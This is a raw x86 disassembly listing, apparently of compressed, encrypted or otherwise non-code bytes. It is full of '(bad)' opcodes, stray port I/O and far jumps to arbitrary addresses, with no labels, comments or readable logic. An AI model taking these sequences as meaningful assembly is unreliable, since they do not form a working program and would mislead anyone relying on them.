  422d44:	(bad)  
  422d45:	in     al,0x7
  422d47:	aam    0x67
  422d49:	out    dx,al
  422d4a:	fmul   st(2),st
  422d4c:	jmp    0x422d9c
  422d4e:	nop
  422d4f:	adc    bh,BYTE PTR [edi+0x70]
  422d52:	pop    ebp
  422d53:	scas   eax,DWORD PTR es:[edi]
  422d54:	in     al,0x7b
  422d56:	shl    DWORD PTR [eax],1
  422d58:	xchg   esi,eax
  422d59:	iret   
  422d5a:	inc    ebp
  422d5b:	fidivr WORD PTR [eax-0x52]
  422d5e:	mov    dl,0xdb
  422d60:	adc    eax,0x373cb7b6
  422d65:	ins    BYTE PTR es:[edi],dx
  422d66:	or     BYTE PTR [edi],0x74
  422d69:	mov    ebp,ds
  422d6b:	or     edx,DWORD PTR [ecx]
  422d6d:	inc    ebx
  422d6e:	(bad)  
  422d6f:	js     0x422d71
  422d71:	out    0x0,eax
  422d73:	std    
  422d74:	iret   
  422d75:	loopne 0x422dde
  422d77:	mov    dl,0x89
  422d79:	enter  0x6bad,0x70
  422d7d:	adc    edx,DWORD PTR [ebx-0x1c]
  422d80:	sahf   
  422d81:	test   DWORD PTR [edx-0x25],ebp
  422d84:	push   ebx
  422d85:	jp     0x422dc4
  422d87:	and    ch,ah
  422d89:	scas   eax,DWORD PTR es:[edi]
  422d8a:	je     0x422d3b
  422d8c:	loop   0x422dcc
  422d8e:	ins    DWORD PTR es:[edi],dx
  422d8f:	lds    ebx,FWORD PTR ds:0x7efea84c
  422d95:	ins    BYTE PTR es:[edi],dx
  422d96:	das    
  422d97:	stos   DWORD PTR es:[edi],eax
  422d98:	mov    esp,0xe78920ef
  422d9d:	pushf  
  422d9e:	add    DWORD PTR [ecx],esp
  422da0:	loopne 0x422daf
  422da2:	cmp    al,0xd
  422da4:	and    al,0x75
  422da6:	fst    DWORD PTR [eax+0x64]
  422da9:	loopne 0x422d73
  422dab:	sub    bl,BYTE PTR [ebx+edi*4]
  422dae:	sbb    eax,0x70bccbff
  422db3:	into   
  422db4:	xchg   ecx,eax
  422db5:	pop    ebp
  422db6:	mov    ds:0xa7cef68b,al
  422dbb:	popf   
  422dbc:	into   
  422dbd:	add    DWORD PTR [ecx],edi
  422dbf:	xor    eax,ecx
  422dc1:	stos   DWORD PTR es:[edi],eax
  422dc2:	popf   
  422dc3:	cdq    
  422dc4:	mov    ch,ch
  422dc6:	mov    edx,0xd9cac832
  422dcb:	add    BYTE PTR [ecx+0x45],0xe9
  422dcf:	pop    esp
  422dd0:	add    DWORD PTR [esi+ebx*8],ebx
  422dd3:	pusha  
  422dd4:	ss xchg ebp,eax
  422dd6:	sbb    al,0x68
  422dd8:	add    DWORD PTR [ebp-0x7285fc39],edi
  422dde:	ret    0x6ade
  422de1:	pop    esi
  422de2:	js     0x422e62
  422de4:	loope  0x422e0d
  422de6:	xchg   BYTE PTR [edi],ah
  422de8:	test   ecx,esi
  422dea:	in     eax,0x74
  422dec:	lods   al,BYTE PTR ds:[esi]
  422ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dee:	and    BYTE PTR [eax-0x13],bh
  422df1:	leave  
  422df2:	xchg   edi,eax
  422df3:	rep outs dx,BYTE PTR ds:[esi]
  422df5:	ins    DWORD PTR es:[edi],dx
  422df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422df7:	sub    DWORD PTR [esp+eax*4-0x629f61ff],0xd806dca
  422e02:	stc    
  422e03:	push   ebx
  422e04:	xchg   DWORD PTR ds:0x1c45e1b7,edi
  422e0a:	int3   
  422e0b:	mov    dh,BYTE PTR [edx+0x2080f8de]
  422e11:	mov    ebp,0x5476378f
  422e16:	nop
  422e17:	and    al,0x3
  422e19:	add    eax,0x3329dd74
  422e1e:	ss xchg ecx,eax
  422e20:	sub    eax,0xa831c2f1
  422e25:	ret    0xfc5b
  422e28:	in     eax,0x75
  422e2a:	xor    edx,ebx
  422e2c:	mov    edi,0xb185093e
  422e31:	push   0xffffffee
  422e33:	stos   DWORD PTR es:[edi],eax
  422e34:	jp     0x422e69
  422e36:	fcom   QWORD PTR [ebx+0x529222cf]
  422e3c:	jge    0x422e30
  422e3e:	daa    
  422e3f:	pop    esi
  422e40:	jg     0x422e40
  422e42:	and    DWORD PTR [edi],edx
  422e44:	sub    eax,0xee4a32e6
  422e49:	add    DWORD PTR [eax-0x4a29f31],eax
  422e4f:	mov    al,ds:0xc923306
  422e54:	and    esp,ebp
  422e56:	(bad)  
  422e57:	imul   esi,ebx,0x41
  422e5a:	addr16 dec ebx
  422e5c:	stc    
  422e5d:	xchg   esp,eax
  422e5e:	in     al,0xe4
  422e60:	(bad)  
  422e61:	retf   0xd1f
  422e64:	jg     0x422e42
  422e66:	sbb    bh,BYTE PTR [edi+0x7e87d35a]
  422e6c:	mov    dl,0x2b
  422e6e:	push   ebx
  422e6f:	xchg   edi,edx
  422e71:	xchg   esi,eax
  422e72:	pushf  
  422e73:	dec    edi
  422e74:	sbb    bl,al
  422e76:	inc    esi
  422e77:	(bad)  
  422e78:	retf   
  422e79:	jmp    0x422e63
  422e7b:	cmp    BYTE PTR [ecx+edi*2],ah
  422e7e:	icebp  
  422e7f:	lods   eax,DWORD PTR ds:[esi]
  422e80:	je     0x422e4a
  422e82:	or     eax,0xa60c7356
  422e87:	push   esp
  422e88:	pop    eax
  422e89:	adc    edi,ecx
  422e8b:	pop    ecx
  422e8c:	jge    0x422f01
  422e8e:	xor    BYTE PTR [eax-0x1b0914ff],ah
  422e94:	pushf  
  422e95:	mov    edi,0x81c7696b
  422e9a:	push   edx
  422e9b:	sub    ah,ah
  422e9d:	aam    0x53
  422e9f:	push   eax
  422ea0:	mov    ds:0xda643bc3,eax
  422ea5:	pop    ebx
  422ea6:	sub    DWORD PTR [ecx+0x2e01831c],ebx
  422eac:	xchg   DWORD PTR ds:0x7e67f87,ecx
  422eb2:	std    
  422eb3:	pusha  
  422eb4:	sbb    BYTE PTR [ebx-0x6f2cd105],bh
  422eba:	fisttp DWORD PTR [eax-0xc]
  422ebd:	dec    edx
  422ebe:	adc    al,0x36
  422ec0:	stc    
  422ec1:	jnp    0x422f09
  422ec3:	scas   al,BYTE PTR es:[edi]
  422ec4:	in     eax,0xc2
  422ec6:	push   ebx
  422ec7:	pop    edi
  422ec8:	outs   dx,BYTE PTR ds:[esi]
  422ec9:	das    
  422eca:	mov    ecx,DWORD PTR [ecx-0x52]
  422ecd:	push   eax
  422ece:	je     0x422ed7
  422ed0:	das    
  422ed1:	neg    BYTE PTR [esi]
  422ed3:	mov    ds:0xd3341415,al
  422ed8:	cmp    esp,edx
  422eda:	pop    ebp
  422edb:	bnd jmp 0x422e82
  422ede:	addr16 inc ebp
  422ee0:	popa   
  422ee1:	loop   0x422edd
  422ee3:	fdivr  st,st(3)
  422ee5:	pop    esp
  422ee6:	inc    ebx
  422ee7:	shl    esi,0xe1
  422eea:	jge    0x422e9d
  422eec:	mov    ah,0xe5
  422eee:	push   ds
  422eef:	pop    esp
  422ef0:	push   edi
  422ef1:	clc    
  422ef2:	arpl   WORD PTR [edi+0x2a],sp
  422ef5:	pop    eax
  422ef6:	cli    
  422ef7:	test   al,0xe1
  422ef9:	adc    BYTE PTR [edi],dl
  422efb:	xor    eax,DWORD PTR [edi]
  422efd:	mov    ebp,0x8d9b25b1
  422f02:	mov    DWORD PTR [ebp+0x73],ebp
  422f05:	pop    esp
  422f06:	push   eax
  422f07:	hlt    
  422f08:	sbb    DWORD PTR [edi-0x7bfab32],edi
  422f0e:	jmp    0xc7f4:0x3c06065
  422f15:	xor    DWORD PTR [edx+0x43],edx
  422f18:	adc    edi,DWORD PTR [ecx]
  422f1a:	sub    bl,bh
  422f1c:	mov    edi,0xa4385ec9
  422f21:	dec    edi
  422f22:	cmp    DWORD PTR [ebx+0x4e],ebp
  422f25:	cmc    
  422f26:	popf   
  422f27:	mov    ah,0xc7
  422f29:	sbb    DWORD PTR [esi],edi
  422f2b:	adc    cl,BYTE PTR [ebp+0x789c4a53]
  422f31:	(bad)  
  422f32:	push   ecx
  422f33:	cli    
  422f34:	es js  0x422f71
  422f37:	gs mov esp,0xda83e1c5
  422f3d:	es dec edi
  422f3f:	mov    WORD PTR [esi],?
  422f41:	jne    0x422ef0
  422f43:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  422f45:	jae    0x422fc5
  422f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f48:	or     edi,ebp
  422f4a:	push   ecx
  422f4b:	sti    
  422f4c:	sub    DWORD PTR [esi-0x7b654c16],ebx
  422f52:	mov    esp,0xb3b61879
  422f57:	bound  esi,QWORD PTR [eax]
  422f59:	adc    dh,BYTE PTR [ebp+0x54]
  422f5c:	pop    es
  422f5d:	mov    ah,0x9c
  422f5f:	gs out 0xeb,al
  422f62:	rep outs dx,DWORD PTR ds:[esi]
  422f64:	push   ecx
  422f65:	push   ebp
  422f66:	retf   
  422f67:	leave  
  422f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f69:	rol    DWORD PTR [esi-0x3f622754],cl
  422f6f:	pop    ecx
  422f70:	sbb    BYTE PTR ss:[ecx],0x57
  422f74:	dec    ebx
  422f75:	ret    0xb46f
  422f78:	jmp    0x422f3d
  422f7a:	inc    esi
  422f7b:	push   ecx
  422f7c:	std    
  422f7d:	out    dx,al
  422f7e:	or     ah,BYTE PTR [ebp+0x1e]
  422f81:	xchg   ecx,eax
  422f82:	dec    edi
  422f83:	stc    
  422f84:	or     eax,0x52518000
  422f89:	(bad)  
  422f8a:	test   DWORD PTR fs:0xcc24c4a7,ecx
  422f91:	add    DWORD PTR [edi+0x6b94fb65],edx
  422f97:	sub    ch,BYTE PTR [ecx-0x6a]
  422f9a:	mov    al,0x68
  422f9c:	cmp    eax,0x6170d579
  422fa1:	add    esp,DWORD PTR [eax-0x38]
  422fa4:	adc    DWORD PTR [ebx-0x1f],esi
  422fa7:	out    0xb6,al
  422fa9:	jo     0x423007
  422fab:	bound  ebp,QWORD PTR [ebp+0x2b]
  422fae:	mov    eax,0x27a19fe2
  422fb3:	leave  
  422fb4:	icebp  
  422fb5:	jnp    0x422fff
  422fb7:	mov    al,0x52
  422fb9:	or     al,0x6e
  422fbb:	mov    edx,0x2042b47
  422fc0:	sahf   
  422fc1:	dec    ebp
  422fc2:	xor    al,0x9
  422fc4:	and    BYTE PTR [ebp+0x205ac060],ch
  422fca:	jl     0x422ff3
  422fcc:	or     al,0x4c
  422fce:	test   BYTE PTR [edi+0xc],bh
  422fd1:	cmp    dh,ah
  422fd3:	in     eax,0x8d
  422fd5:	add    DWORD PTR [ebp-0x146ed499],0xffffffa4
  422fdc:	ror    esp,0x84
  422fdf:	xchg   ebx,eax
  422fe0:	in     al,0x0
	...
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x423002
  422ff7:	push   es
  422ff8:	and    DWORD PTR [esi+eax*2-0x42],ecx
  422ffc:	add    DWORD PTR [eax],eax
  422ffe:	jg     0x423006
  423000:	add    BYTE PTR [eax],al
  423002:	sub    ch,BYTE PTR [ebp-0x56f2bc9c]
  423008:	jmp    0x422fe7
  42300a:	mov    ch,BYTE PTR [edi+0x76]
  42300d:	fbld   TBYTE PTR [ebp-0x39]
  423010:	sub    DWORD PTR [edi+0x11],esi
  423013:	xor    bh,BYTE PTR [ecx]
  423015:	xchg   esp,eax
  423016:	sub    al,0x1f
  423018:	xchg   ebp,eax
  423019:	lea    ecx,[ebp+0xd]
  42301c:	jecxz  0x423078
  42301e:	or     BYTE PTR [ecx+0xa],cl
  423021:	dec    eax
  423022:	pop    ss
  423023:	cmp    esi,0x8454cf0f
  423029:	dec    edx
  42302a:	mov    edi,0xbb7227ac
  42302f:	jnp    0x423043
  423031:	and    al,0x41
  423033:	adc    al,0xb2
  423035:	cmp    BYTE PTR [edx],dh
  423037:	mov    bl,0xf1
  423039:	js     0x422fce
  42303b:	jnp    0x42302e
  42303d:	inc    ecx
  42303e:	mov    edi,DWORD PTR [eax-0x51]
  423041:	lock ret 
  423043:	call   0xc8c:0xc6d966b9
  42304a:	sbb    BYTE PTR ds:0xb49a,ch
  42304f:	dec    edi
  423050:	nop
  423051:	push   0xffffff85
  423053:	js     0x42305c
  423055:	xchg   edi,eax
  423056:	inc    edi
  423057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423058:	adc    ebp,DWORD PTR [eax+0x53]
  42305b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42305c:	fdivr  DWORD PTR ds:0xe8ba1d81
  423063:	mov    ecx,esp
  423065:	loop   0x4230e0
  423067:	aam    0xec
  423069:	mov    cl,0xf3
  42306b:	adc    DWORD PTR [esi-0x6e8a16c1],esi
  423071:	repz mov ah,0xfe
  423074:	pop    ebp
  423075:	inc    eax
  423076:	sbb    DWORD PTR [ebx+0x48],edx
  423079:	inc    eax
  42307a:	rol    esp,cl
  42307c:	shl    esi,cl
  42307e:	sub    dh,BYTE PTR [esi]
  423080:	mov    esi,0xc40bbfb9
  423085:	bound  ebp,QWORD PTR [ebp-0x5c36aaaa]
  42308b:	(bad)  [ecx+0x69]
  42308e:	cmp    edi,DWORD PTR [ebp-0x36]
  423091:	jle    0x4230c0
  423093:	push   esi
  423094:	pop    ecx
  423095:	cli    
  423096:	ins    BYTE PTR es:[edi],dx
  423097:	jecxz  0x423037
  423099:	clc    
  42309a:	or     BYTE PTR [ecx-0x2a508cec],0xe6
  4230a1:	push   ss
  4230a2:	daa    
  4230a3:	pop    edx
  4230a4:	dec    ebp
  4230a5:	fcom   QWORD PTR [eax]
  4230a7:	std    
  4230a8:	jbe    0x423036
  4230aa:	add    eax,0x166dd455
  4230af:	push   ds
  4230b0:	mov    eax,ds:0xaa35bf16
  4230b5:	sbb    BYTE PTR [ebp-0x5ecd266e],ch
  4230bb:	jmp    edx
  4230bd:	xchg   ebx,eax
  4230be:	dec    eax
  4230bf:	xchg   ecx,eax
  4230c0:	or     al,0xf9
  4230c2:	mov    bh,BYTE PTR [edi]
  4230c4:	call   0xf1ec:0x2ade237b
  4230cb:	push   ss
  4230cc:	outs   dx,BYTE PTR ds:[esi]
  4230cd:	sub    al,0xb
  4230cf:	and    dh,BYTE PTR ds:0x80ad7851
  4230d5:	or     ebx,DWORD PTR [eax-0x8]
  4230d8:	dec    esp
  4230d9:	xlat   BYTE PTR ds:[ebx]
  4230da:	mov    cl,0x59
  4230dc:	pusha  
  4230dd:	cmc    
  4230de:	ret    
  4230df:	sub    al,0xca
  4230e1:	mov    esp,0xe92589be
  4230e6:	jle    0x423068
  4230e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230e9:	retf   
  4230ea:	dec    edi
  4230eb:	rol    BYTE PTR [ebx+esi*2],0xea
  4230ef:	xchg   ecx,eax
  4230f0:	dec    edx
  4230f1:	push   0x3ad50ac0
  4230f6:	fst    QWORD PTR [esi]
  4230f8:	dec    ebp
  4230f9:	outs   dx,BYTE PTR ds:[esi]
  4230fa:	or     BYTE PTR [edi],cl
  4230fc:	enter  0x94ee,0xc4
  423100:	cld    
  423101:	xchg   edx,eax
  423102:	pop    es
  423103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423104:	sbb    al,0x2d
  423106:	or     eax,0xd6f31c37
  42310b:	mov    di,sp
  42310e:	sub    eax,0x621aab11
  423113:	inc    esi
  423114:	aam    0x27
  423116:	repz test DWORD PTR [ecx],eax
  423119:	icebp  
  42311a:	lods   al,BYTE PTR ds:[esi]
  42311b:	push   ds
  42311c:	scas   eax,DWORD PTR es:[edi]
  42311d:	xchg   edi,eax
  42311e:	gs lahf 
  423120:	dec    ebx
  423121:	jle    0x423158
  423123:	(bad)  
  423124:	imul   edi,DWORD PTR [ebp-0x95aaeda],0x61
  42312b:	mov    edx,0xa4123926
  423130:	push   es
  423131:	cmp    al,0x7
  423133:	(bad)  
  423134:	popa   
  423135:	cmp    esi,ecx
  423137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423138:	adc    DWORD PTR [eax+0x7679d616],eax
  42313e:	test   eax,0x42894ca8
  423143:	xlat   BYTE PTR ds:[ebx]
  423144:	mov    cl,BYTE PTR [edi+0x42]
  423147:	cmp    al,0x41
  423149:	fs dec ecx
  42314b:	or     DWORD PTR [edi+0x70],0x32
  42314f:	loopne 0x42316b
  423151:	iret   
  423152:	mov    bh,0x43
  423154:	pop    edx
  423155:	jo     0x423124
  423157:	retf   0x6b25
  42315a:	ret    
  42315b:	fisub  WORD PTR [edi-0x52]
  42315e:	push   ss
  42315f:	adc    al,0xa7
  423161:	call   0x478d6f2
  423166:	loope  0x4231bf
  423168:	loope  0x4230f2
  42316a:	adc    bh,cl
  42316c:	bound  ebx,QWORD PTR [esi+0x59]
  42316f:	mov    edx,0x75edb5a3
  423174:	sub    DWORD PTR [esi],ebx
  423176:	neg    BYTE PTR [edi+0x367160c7]
  42317c:	add    eax,0xa21f5d28
  423181:	ins    BYTE PTR es:[edi],dx
  423182:	xchg   BYTE PTR [eax+0x4385cd20],bh
  423188:	add    BYTE PTR [ebx],al
  42318a:	cld    
  42318b:	add    DWORD PTR fs:[edx+0xe],edx
  42318f:	cld    
  423190:	(bad)  [edi+0x7ea4b5e6]
  423196:	jmp    0x42312c
  423198:	in     al,0xb3
  42319a:	shl    DWORD PTR [edx-0x7c],cl
  42319d:	ret    
  42319e:	xlat   BYTE PTR ds:[ebx]
  42319f:	icebp  
  4231a0:	push   es
  4231a1:	lods   eax,DWORD PTR ds:[esi]
  4231a2:	sub    DWORD PTR [ebp+ebx*2+0x4a],ebp
  4231a6:	xor    edi,DWORD PTR [ecx]
  4231a8:	imul   edx,ebp,0x77387bd5
  4231ae:	icebp  
  4231af:	shl    BYTE PTR [ebx],cl
  4231b1:	ret    
  4231b2:	push   0xffffffc6
  4231b4:	mov    dh,0xfe
  4231b6:	adc    al,0xcd
  4231b8:	inc    esp
  4231b9:	mov    ds:0x4c70d30e,eax
  4231be:	bound  eax,QWORD PTR [eax+0x6c]
  4231c1:	iret   
  4231c2:	dec    ecx
  4231c3:	mov    ecx,0xb46c2246
  4231c8:	cmp    eax,0xb9bff0
  4231cd:	add    ecx,DWORD PTR [ebx-0x45]
  4231d0:	push   esi
  4231d1:	or     BYTE PTR [edx+0x243a1329],dh
  4231d7:	(bad)  
  4231d8:	xor    al,BYTE PTR [esi+ebx*2]
  4231db:	or     al,0xe8
  4231dd:	es dec ecx
  4231df:	and    ah,BYTE PTR [esi]
  4231e1:	ret    0xaba0
  4231e4:	xchg   edx,eax
  4231e5:	adc    ah,ch
  4231e7:	jg     0x423255
  4231e9:	pusha  
  4231ea:	ss mov edx,0x1e304d3d
  4231f0:	or     esp,DWORD PTR [ebx]
  4231f2:	and    BYTE PTR [esi],dh
  4231f4:	mov    DWORD PTR [ebx+esi*1-0x421fec86],edx
  4231fb:	push   0xe6753b01
  423200:	xor    ah,BYTE PTR [edx]
  423202:	test   BYTE PTR [edi+edi*1+0x17cd6490],bl
  423209:	clc    
  42320a:	xchg   edi,eax
  42320b:	xchg   ecx,eax
  42320c:	ss sti 
  42320e:	popa   
  42320f:	ret    0xd9f7
  423212:	rcl    DWORD PTR [eax-0x7eca9443],0x34
  423219:	inc    ebx
  42321a:	inc    edi
  42321b:	in     al,dx
  42321c:	lea    esp,[edi-0x3c1d43cc]
  423222:	ss (bad) 
  423224:	cmc    
  423225:	sbb    bl,BYTE PTR [ecx+0x77]
  423228:	xchg   ecx,eax
  423229:	mov    cl,0xfe
  42322b:	adc    ebp,DWORD PTR [edi+0x46]
  42322e:	pop    esi
  42322f:	stos   BYTE PTR es:[edi],al
  423230:	rcl    ch,1
  423232:	retf   
  423233:	ss out dx,al
  423235:	bound  edx,QWORD PTR [ebx+0x4388a091]
  42323b:	ins    DWORD PTR es:[edi],dx
  42323c:	retf   0xddff
  42323f:	lods   eax,DWORD PTR ds:[esi]
  423240:	sbb    BYTE PTR [ebx-0x3be2c47c],bh
  423246:	xor    dh,ah
  423248:	jae    0x42325f
  42324a:	rcr    DWORD PTR [ecx+0x612ddae8],1
  423250:	fcmove st,st(0)
  423252:	pop    edx
  423253:	not    DWORD PTR [ebp+0x699e6153]
  423259:	jb     0x42329a
  42325b:	data16 ja 0x423246
  42325e:	mov    esp,0xabd5f3ce
  423263:	aad    0xb1
  423265:	mov    eax,0xa30f6f0
  42326a:	(bad)  
  42326b:	sti    
  42326c:	xchg   ebx,eax
  42326d:	jmp    0x4232b5
  42326f:	inc    ebx
  423270:	xchg   DWORD PTR [ecx+0x72ba527],esp
  423276:	ret    
  423277:	hlt    
  423278:	push   ebx
  423279:	mov    cl,0xdf
  42327b:	sbb    esi,eax
  42327d:	enter  0xa8ce,0x92
  423281:	push   esi
  423282:	aam    0x48
  423284:	push   edx
  423285:	dec    ebx
  423286:	nop
  423287:	inc    ebx
  423288:	xchg   esi,eax
  423289:	jge    0x4232d8
  42328b:	pop    ebx
  42328c:	arpl   WORD PTR [esi],sp
  42328e:	push   edi
  42328f:	push   ecx
  423290:	mov    edi,0xf1e698cb
  423296:	adc    al,0x97
  423298:	jnp    0x423245
  42329a:	dec    edx
  42329b:	call   0xcfea96c0
  4232a0:	add    al,0xbf
  4232a2:	test   al,0x80
  4232a4:	sahf   
  4232a5:	aam    0xe6
  4232a7:	adc    al,0x9f
  4232a9:	shr    BYTE PTR [ebx-0x7df7edd6],cl
  4232af:	test   al,0xec
  4232b1:	fstp   DWORD PTR [ebp-0x7c]
  4232b4:	adc    DWORD PTR [esi-0x41],edi
  4232b7:	push   ecx
  4232b8:	sbb    eax,0x8c214bef
  4232bd:	jp     0x4232b1
  4232bf:	cwde   
  4232c0:	push   edi
  4232c1:	jmp    0xdc12cc8
  4232c6:	push   ecx
  4232c7:	repz cwde 
  4232c9:	inc    edi
  4232ca:	push   0x5e0d29a4
  4232cf:	mov    ch,0x75
  4232d1:	popf   
  4232d2:	rol    DWORD PTR ds:0x680e2546,1
  4232d8:	add    eax,0x975a4e0b
  4232dd:	(bad)  
  4232de:	jmp    0x423261
  4232e0:	fucomip st,st(5)
  4232e2:	popa   
  4232e3:	xlat   BYTE PTR ds:[ebx]
  4232e4:	or     esp,eax
  4232e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232e7:	mov    gs,WORD PTR ss:[ebx]
  4232ea:	fcmovnu st,st(2)
  4232ec:	jo     0x423366
  4232ee:	outs   dx,DWORD PTR ds:[esi]
  4232ef:	dec    esi
  4232f0:	popa   
  4232f1:	sub    esi,DWORD PTR [edi]
  4232f3:	out    0xbd,al
  4232f5:	std    
  4232f6:	imul   eax,DWORD PTR [edi-0x13],0x10
  4232fa:	mov    esp,0xa2e1624c
  4232ff:	in     eax,0xb6
  423301:	loop   0x42335d
  423303:	call   0xa124b8f7
  423308:	cmp    al,0xc9
  42330a:	pop    esp
  42330b:	push   eax
  42330c:	pop    edi
  42330d:	mov    al,0x97
  42330f:	adc    BYTE PTR [eax-0x1bb9863],ah
  423315:	out    0x8,al
  423317:	xlat   BYTE PTR ds:[ebx]
  423318:	or     eax,0x73ab8233
  42331d:	or     BYTE PTR [eax+edx*4-0xc],bl
  423321:	rep ins BYTE PTR es:[edi],dx
  423323:	adc    BYTE PTR [edx+eiz*8],dl
  423326:	sar    DWORD PTR [ecx],0x49
  423329:	out    0xf,al
  42332b:	or     bh,BYTE PTR [ecx-0x1e]
  42332e:	ins    DWORD PTR es:[edi],dx
  42332f:	jecxz  0x423333
  423331:	mov    ebx,0x12d30296
  423336:	(bad)  
  423337:	retf   
  423338:	fst    QWORD PTR [esp+ecx*2-0x4c126bd0]
  42333f:	mov    ds:0xf2081f2f,al
  423344:	mov    ecx,0x101eb0e5
  423349:	push   eax
  42334a:	mov    edx,edx
  42334c:	pop    ss
  42334d:	dec    ecx
  42334e:	push   0xffffffca
  423350:	sbb    ah,BYTE PTR [edx+0x4e]
  423353:	add    DWORD PTR [ebx],0xffffffd2
  423356:	fs cmc 
  423358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423359:	jne    0x423327
  42335b:	mov    edx,0x1df9e652
  423360:	cmp    al,0x9c
  423362:	pop    ebp
  423363:	fidivr DWORD PTR ds:0xc026bd03
  423369:	jno    0x423388
  42336b:	fld    st(1)
  42336d:	xchg   ebx,eax
  42336e:	mov    dh,BYTE PTR [ecx]
  423370:	hlt    
  423371:	inc    ebx
  423372:	mov    esi,0xd9b8a6ae
  423377:	push   es
  423378:	mov    dl,0x6f
  42337a:	sti    
  42337b:	rcl    edi,1
  42337d:	mov    ds:0xff524b24,al
  423382:	push   edx
  423383:	test   DWORD PTR [edx+0x5ea42f76],0xa9c4704d
  42338d:	ins    BYTE PTR es:[edi],dx
  42338e:	xor    DWORD PTR [ebx-0x37],0x970da600
  423395:	lea    esi,[edx-0x157640e3]
  42339b:	out    dx,al
  42339c:	ret    0x56a6
  42339f:	xchg   DWORD PTR [eax+0x144e6271],ebx
  4233a5:	cmp    eax,ebp
  4233a7:	jecxz  0x4233ac
  4233a9:	ins    DWORD PTR es:[edi],dx
  4233aa:	mov    cl,BYTE PTR [esi+0x71]
  4233ad:	and    eax,0xfffffffe
  4233b0:	(bad)  [esi+ebx*2-0x3e790d1d]
  4233b7:	xchg   ebp,eax
  4233b8:	or     cl,BYTE PTR [ebp+0x1268f84c]
  4233be:	push   edi
  4233bf:	push   ds
  4233c0:	repnz test eax,0x98be8f6a
  4233c6:	inc    eax
  4233c7:	mov    ebx,0xf3e01fad
  4233cc:	add    dh,BYTE PTR [ecx]
  4233ce:	xor    eax,0xdc678ae0
  4233d3:	cmp    DWORD PTR [edi+eiz*8-0x3b],ecx
  4233d7:	mov    si,0x6078
  4233db:	loop   0x4233c2
  4233dd:	aad    0x4a
  4233df:	cmp    esi,edx
  4233e1:	pop    ebp
  4233e2:	fiadd  DWORD PTR [ecx+0x13555633]
  4233e8:	in     al,dx
  4233e9:	pop    es
  4233ea:	retf   
  4233eb:	pop    eax
  4233ec:	sub    bh,bl
  4233ee:	sub    dh,BYTE PTR [ecx+0xb977b88]
  4233f4:	push   ebp
  4233f5:	das    
  4233f6:	add    BYTE PTR [ebx+0x73ce0d68],bh
  4233fc:	retf   0xe91d
  4233ff:	setb   BYTE PTR [esi-0xd8d1994]
  423406:	jge    0x4233a1
  423408:	xor    DWORD PTR [eax],ebp
  42340a:	data16 mov ah,0x6
  42340d:	adc    eax,0x1dbf1a11
  423412:	dec    edi
  423413:	dec    ebp
  423414:	mov    esp,0xe9b40a28
  423419:	jg     0x423408
  42341b:	loop   0x423413
  42341d:	cmp    eax,0xb485a9e9
  423422:	fistp  QWORD PTR [ecx+0x42]
  423425:	pop    ss
  423426:	mov    ebx,0x160ad484
  42342b:	sbb    eax,0x607afbe8
  423430:	retf   
  423431:	pop    ecx
  423432:	iret   
  423433:	push   ebx
  423434:	test   BYTE PTR [edi+eax*4],dl
  423437:	icebp  
  423438:	out    0xf6,al
  42343a:	pop    ecx
  42343b:	and    BYTE PTR [edi-0x40],0x2b
  42343f:	inc    ecx
  423440:	in     al,0x28
  423442:	jmp    0x6ccd:0x9eeea077
  423449:	(bad)  
  42344a:	sbb    al,0x5
  42344c:	iret   
  42344d:	call   0x8a46:0x6a77593d
  423454:	jns    0x4233d8
  423456:	sub    ebp,DWORD PTR [eax]
  423458:	mov    edx,0x2fa3fc52
  42345d:	add    DWORD PTR [ebx-0x18],0xb441fc5a
  423464:	push   edx
  423465:	test   al,0x6a
  423467:	gs dec edx
  423469:	arpl   WORD PTR [esi-0x56ef09f9],cx
  42346f:	stc    
  423470:	arpl   dx,cx
  423472:	cmp    ebp,DWORD PTR [esi+0x2f]
  423475:	stc    
  423476:	dec    ecx
  423477:	pop    ebx
  423478:	or     ch,BYTE PTR [eax]
  42347a:	mov    edi,0xa9efc6ce
  42347f:	push   0x9cc2fe42
  423484:	mov    edi,0x4eb8a10c
  423489:	mov    BYTE PTR [edx+0x775507d6],dh
  42348f:	mov    ah,0x14
  423491:	adc    esi,DWORD PTR [edx]
  423493:	mov    al,ds:0xae3bdbf
  423498:	arpl   WORD PTR [edx],di
  42349a:	cmp    dl,bl
  42349c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42349d:	retf   0x4ae9
  4234a0:	xchg   DWORD PTR [esi],edi
  4234a2:	into   
  4234a3:	pop    ds
  4234a4:	ss in  eax,dx
  4234a6:	shl    DWORD PTR [eax],0xa4
  4234a9:	into   
  4234aa:	rcr    BYTE PTR [ebp-0x40],1
  4234ad:	aad    0x11
  4234af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234b0:	push   edx
  4234b1:	aas    
  4234b2:	cdq    
  4234b3:	call   0x4e4b:0xee391364
  4234ba:	or     BYTE PTR [edi+0x3ff96766],ch
  4234c0:	int3   
  4234c1:	push   ss
  4234c2:	mov    esi,0xacbc81a7
  4234c7:	les    esp,FWORD PTR [ebp+0x1b]
  4234ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234cb:	test   al,0x92
  4234cd:	push   es
  4234ce:	cmp    dl,dl
  4234d0:	sti    
  4234d1:	mov    ah,BYTE PTR [eax]
  4234d3:	jl     0x4234d0
  4234d5:	ss out dx,al
  4234d7:	inc    esi
  4234d8:	(bad)  
  4234d9:	cld    
  4234da:	xchg   ebp,eax
  4234db:	ja     0x423500
  4234dd:	adc    DWORD PTR [edi],eax
